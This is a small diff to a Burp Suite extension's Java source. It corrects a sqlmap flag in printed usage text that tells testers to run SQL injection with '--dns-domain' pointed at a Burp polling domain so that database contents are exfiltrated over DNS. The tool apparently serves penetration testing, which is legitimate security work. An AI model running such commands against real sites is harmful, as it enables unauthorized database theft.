@@ -17,7 +17,7 @@ public class BurpExtender implements IBurpExtender
 
         callbacks.printOutput("******************************************************************************************************************************************************");
         callbacks.printOutput("** Run Sqlmap with all the parameters you want and add the following one: --dns-domain="+pollPayload);
-        callbacks.printOutput("** EXAMPLE: sqlmap.py -u \"https://yourvulnerabletarget.com\" -dbs --dns-domain="+pollPayload);
+        callbacks.printOutput("** EXAMPLE: sqlmap.py -u \"https://yourvulnerabletarget.com\" --dbs --dns-domain="+pollPayload);
         callbacks.printOutput("** After you are done exfiltrating data via DNS, unload this Burp Extension.");
         callbacks.printOutput("** Reload it whenever you want to use it again.");
         callbacks.printOutput("******************************************************************************************************************************************************");
